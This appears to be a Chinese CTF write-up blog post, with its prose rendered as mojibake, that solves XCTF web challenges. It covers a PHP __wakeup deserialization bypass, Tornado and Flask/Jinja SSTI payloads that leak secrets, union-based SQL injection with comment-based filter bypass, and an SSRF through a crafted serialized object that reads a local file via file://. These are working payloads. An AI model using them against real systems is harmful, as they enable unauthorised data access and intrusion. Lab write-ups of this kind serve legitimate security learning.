> unserialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__wakeup()ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚

payloadå¦‚ä¸‹

```
<?php
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
}
$a = new xctf();
print(serialize($a));

?>
```

```
O:4:"xctf":1:{s:4:"flag";s:3:"111";}    //1-->2å³å¯ç»•è¿‡é­”æ³•å‡½æ•°
```

![image-20220626123536332](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261235408.png?x-oss-process=hzy)

> å½“è¢«ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²å…¶ä¸­å¯¹åº”çš„å¯¹è±¡çš„å±æ€§ä¸ªæ•°å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥è€ŒåŒæ—¶__wakeupä¹Ÿä¼šå¤±æ•ˆï¼Œå®ç°ç»•è¿‡

# easytornado

> Tornado æ¡†æ¶

- ***Tornado çš„ SSTI æ¼æ´***
- ***Tornado ä¸­çš„ cookie_secret å€¼*** 
-  ***Python3 ä¸­çš„ hashlib æ¨¡å—***

é¢˜ç›®æç¤ºæ¡†æ¶æ¼æ´ï¼Œè°·æ­Œæ‰¾åˆ©ç”¨å°±è¡Œ

![image-20220626124211039](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261242097.png?x-oss-process=hzy)

![image-20220626124222711](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261242766.png?x-oss-process=hzy)

![image-20220626124409420](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261244469.png?x-oss-process=hzy)

![image-20220626124415019](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261244068.png?x-oss-process=hzy)

ç›´æ¥è®¿é—®ä¸è¡Œ

![image-20220626124725754](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261247806.png?x-oss-process=hzy)

```
ä½†æ˜¯å‘ç°http://111.200.241.244:57423/error?msg=Errorå¯¹åº”Errorï¼Œç»è¿‡æµ‹è¯•ä¹Ÿè¯å®äº†è¿™ä¸€ç‚¹
```

![image-20220626124816070](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261248119.png?x-oss-process=hzy)

å­˜åœ¨ssti

![image-20220626124928654](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261249699.png?x-oss-process=hzy)

![image-20220626124921471](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261249527.png?x-oss-process=hzy)

ä½†æ˜¯æœ‰æ³¨å…¥è¢«è¿‡æ»¤äº†

è¿™ä¸ªæ—¶å€™æ³¨æ„åˆ©ç”¨hint

```
md5(cookie_secret+md5(filename))
//  è¯¥è¡¨è¾¾å¼çš„ç»“æœåº”è¯¥æ˜¯å¯¹åº”ç€ URL ä¸­çš„ filehash å‚æ•°çš„å€¼ã€‚æˆ‘ä»¬å·²ç»çŸ¥é“äº†å­˜æ”¾ flag çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å¾—åˆ°ç›¸åº”çš„ filehash å‚æ•°çš„å€¼ï¼Œå°±å¯ä»¥æ„é€  URL è¿›è€Œå¾—åˆ° flagï¼Œè§‚å¯Ÿè¯¥è¡¨è¾¾å¼ï¼Œfilename æ˜¯æˆ‘ä»¬å·²çŸ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦çŸ¥é“ cookie_secret æ‰€å¯¹åº”çš„å€¼ï¼Œä¾¿å¯ä»¥è®¡ç®—å‡ºè¯¥è¡¨è¾¾å¼çš„ç»“æœã€‚
```

> åœ¨ Tornado ä¸­ï¼Œé€šè¿‡åœ¨ tornado.web.Application ä¸­æ·»åŠ  cookie_secret å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ set_secure_cookie() å’Œ get_secure_cookie() å‡½æ•°æ¥å‘é€å’Œå–å¾—æµè§ˆå™¨çš„ cookies ï¼Œå€ŸåŠ©è¯¥å‚æ•°å¯ä»¥å¯¹ cookie è¿›è¡Œç®€æ˜“åŠ å¯†ä»¥é˜²æ­¢ Cookie è¢«æ¶æ„ç¯¡æ”¹ã€‚

æ¡†æ¶æ¼æ´ä¸æ‹¿æ‰‹ï¼Œå‚è€ƒåˆ«äººwpæ‰åšå‡ºæ¥

æ„é€ payload

```
msg={{handler.settings}} å³å¯è·å–åˆ° cookie_secret
```

![image-20220626125307468](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261253486.png?x-oss-process=hzy)

æ—¢ç„¶ filename å’Œ cookie_secret æˆ‘ä»¬éƒ½çŸ¥é“äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ© Python è„šæœ¬æ¥è®¡ç®—ç›¸åº”è¡¨è¾¾å¼çš„å€¼

```
#å¯¼å…¥hashlibæ¨¡å—
import hashlib

#è·å–ä¸€ä¸ªmd5åŠ å¯†ç®—æ³•å¯¹è±¡
md = hashlib.md5()
#ç”¨æä¾›çš„ å­—èŠ‚ä¸² æ›´æ–°æ­¤å“ˆå¸Œå¯¹è±¡(hash object)çš„çŠ¶æ€ã€‚
md.update('/fllllllllllllag'.encode('utf-8'))
#NOTICEï¼š
#update()æ–¹æ³•éœ€è¦æ¥æ”¶çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—èŠ‚å¯¹è±¡ã€‚
#å‘å¯¹è±¡ä¸­ä¼ å…¥å­—èŠ‚ä¸²æ—¶ï¼Œå¿…é¡»ä¸ºç¼–ç ç±»å‹ã€‚å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å‰b' 'çš„æ–¹æ³•æˆ–ä½¿ç”¨.encode('UTF-8')çš„æ–¹æ³•ï¼Œä½¿å­—ç¬¦ä¸²å˜ä¸ºbytesç±»å‹

#ä»¥åå…­è¿›åˆ¶æ•°å­—å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›æ‘˜è¦å€¼ï¼ˆå“ˆå¸Œå‡½æ•°è®¡ç®—åç”Ÿæˆçš„å€¼å°±å«åšæ‘˜è¦æˆ–è€…æ‘˜è¦å€¼ï¼‰
fact = md.hexdigest()

md = hashlib.md5()
md.update(('5d1bf6b4-a2ca-413b-a504-87c986ed69ec' + fact).encode('utf-8'))
print(md.hexdigest())
```

![image-20220626125552423](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261255479.png?x-oss-process=hzy)

å‚è€ƒï¼š

[(43æ¡æ¶ˆæ¯) XCTFç³»åˆ— // Web | easytornado_Ga1axy_zçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/qq_45805420/article/details/107876871)

[(43æ¡æ¶ˆæ¯) python3 hashlib.md5()_update()_digest()_hexdigest().py_å­¦æ— æ­¢å¢ƒæ…¢æ…¢æ¥çš„åšå®¢-CSDNåšå®¢_hashlib.md5().update](https://blog.csdn.net/weixin_42193179/article/details/104520896)

[[æŠ¤ç½‘æ¯ 2018\]easy_tornado - ç®€ä¹¦ (jianshu.com)](https://www.jianshu.com/p/c4070d6f4249)

# shrine

- æ²™ç›’é€ƒé€¸
- ssti

![image-20220626125804186](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261258255.png?x-oss-process=hzy)

ä¸éš¾çœ‹å‡ºæ˜¯python

```
import flask
import os

app = flask.Flask(__name__)

app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()\

@app.route('/shrine/')
def shrine(shrine):
   
   def safe_jinja(s):
       s = s.replace('(', '').replace(')', '')
       blacklist = ['config', 'self']
       return ''.join(['{{% set {}=None%}}'.format(c)for c in blacklist]) + s
       return flask.render_template_string(safe_jinja(shrine))
if __name__ == '__main__':
    app.run(debug=True)
```

[flask](https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020)æ¡†æ¶

è®¿é—®è·¯å¾„å­˜åœ¨ssti

![image-20220626125932579](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261259631.png?x-oss-process=hzy)

ä»–å°†configå’Œselfå½“æˆäº†é»‘åå• è€Œflagåœ¨configæ–‡ä»¶é‡Œï¼Œå¦‚æœæ²¡æœ‰é»‘åå•çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ configï¼Œä½†å½“è¿™äº›è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©ä¸€äº›å…¨å±€å˜é‡åˆ©ç”¨æ²™ç›’é€ƒé€¸çš„æ–¹æ³•ï¼Œæ¥è°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°å¯¹è±¡ã€‚

> current_app,è¿™æ˜¯å…¨å±€å˜é‡ä»£ç†ï¼ŒæŸ¥çœ‹ä»–çš„configå³å¯

payloadå¦‚ä¸‹

```
{{url_for.__globals__['current_app'].config}}
```

![image-20220626130240859](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261302920.png?x-oss-process=hzy)

ä¹Ÿå¯ä»¥è·å–å…¨å±€æ–‡æœ¬

```
{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
```

psï¼šæˆ‘æ„Ÿè§‰ç¬¬ä¸€ä¸ªæ¯”è¾ƒå¥½ç†è§£

å‚è€ƒï¼š

[(43æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒºshrineè¯¦è§£_ç„¡åä¹‹æ¶Ÿçš„åšå®¢-CSDNåšå®¢](https://blog.csdn.net/hxhxhxhxx/article/details/107698218)

# fakebook

- SSRF
- sqlæ³¨å…¥

![image-20220707155352650](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071553783.png?x-oss-process=hzy)

![image-20220707154734277](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071547367.png?x-oss-process=hzy)

é¦–å…ˆå…ˆæ³¨å†Œä¸€ä¸ªè¿›å»

![image-20220707154756724](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071547806.png?x-oss-process=hzy)

ç„¶åç›®å½•æ‰«æèƒ½æ‰¾åˆ°robots.txtå’Œflag.php

![image-20220707155614776](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071556887.png?x-oss-process=hzy)

![image-20220707154834772](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071548858.png?x-oss-process=hzy)

è®¿é—®è¿™ä¸ªå¾—åˆ°çš„æ˜¯æºç ï¼Œç®€å•åˆ†æä¸€ä¸‹

```
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

	public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();    // åˆå§‹åŒ–ä¸€ä¸ªcurlä¼šè¯

        curl_setopt($ch, CURLOPT_URL, $url); // è®¾ç½®éœ€è¦æŠ“å–çš„url
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // è®¾ç½®curlå‚æ•°ï¼Œè¦æ±‚ç»“æœä¿å­˜åˆ°å­—ç¬¦ä¸²è¿˜æ˜¯è¾“å‡ºåˆ°å±å¹•ä¸Š
        $output = curl_exec($ch); // è¿è¡Œcurlï¼Œè¯·æ±‚ç½‘é¡µ
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); // è·å–ä¸€ä¸ªcurlè¿æ¥èµ„æºå¥æŸ„çš„ä¿¡æ¯
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch); // å…³é—­curlä¼šè¯

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

å‘ç°è¿™ä¸ªæœ‰ä¸ªgetä¼ å‚![image-20220707155455446](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071554550.png?x-oss-process=hzy)

åŠ ä¸ªå¼•å·å°±ä¼šæŠ¥é”™![image-20220707155512719](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071555816.png?x-oss-process=hzy)

é€šè¿‡order by åˆ¤æ–­åˆ—ä¸º4ï¼Œå¤§äº4æˆ–å°äºå‡4æŠ¥é”™ï¼Œå› æ­¤åˆ¤æ–­æ­¤åˆ—ä¸º4

![](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071601614.png?x-oss-process=hzy)

ç»è¿‡æµ‹è¯•å¯¹å­—ç¬¦è¿›è¡Œäº†ä¸€å®šçš„è¿‡æ»¤

```
-1 /**/union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata --+
```

é€šè¿‡æ³¨é‡Šç¬¦å¯¹å…¶è¿›è¡Œç»•è¿‡![image-20220707160324120](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071604351.png?x-oss-process=hzy)è·å–åˆ°æ•°æ®åº“ï¼šfakebook,information_schema,mysql,performance_schema,test

```
è·å–è¡¨ // è¡¨åä¸ºusers
-1 /**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema="fakebook"--+
```

![image-20220707160500215](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071605311.png?x-oss-process=hzy)

```
è·å–å­—æ®µ
-1 /**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema="fakebook"--+
```

![image-20220707160546839](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071605948.png?x-oss-process=hzy)

```
è·å–å­—æ®µä¿¡æ¯
-1 /**/union/**/select 1,group_concat(data),3,4 from fakebook.users --+
```

![image-20220707160757019](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071607102.png?x-oss-process=hzy)

åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æäº¤çš„æ•°æ®è¿›è¡Œäº†åºåˆ—åŒ–

```
O:8:"UserInfo":3:{s:4:"name";s:3:"aaa";s:3:"age";i:12;s:4:"blog";s:14:"hzy2003628.top";},O:8:"UserInfo":3:{s:4:"name";s:5:"aaaqq";s:3:"age";i:12;s:4:"blog";s:5:"j.com";}
```

é‚£æˆ‘ä»¬å¯ä»¥è¯•è¯•èƒ½ä¸èƒ½ä½¿ç”¨ååºåˆ—åŒ–è¯»å–åˆ°flagæ–‡ä»¶
```
-1 /**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:3:"aaa";s:3:"age";i:12;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' --+
```

![image-20220707161356095](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071613183.png?x-oss-process=hzy)

è§£ç å¾—åˆ°flag

![image-20220707161528602](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071615711.png?x-oss-process=hzy)

ä¸€ä¸‹åˆå°±å†™è¿™äº›ï¼Œå®³ï¼Œç´¯äº†ï¼Œè·‘è·¯äº†

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251740867.jpeg?x-oss-process=hzy)

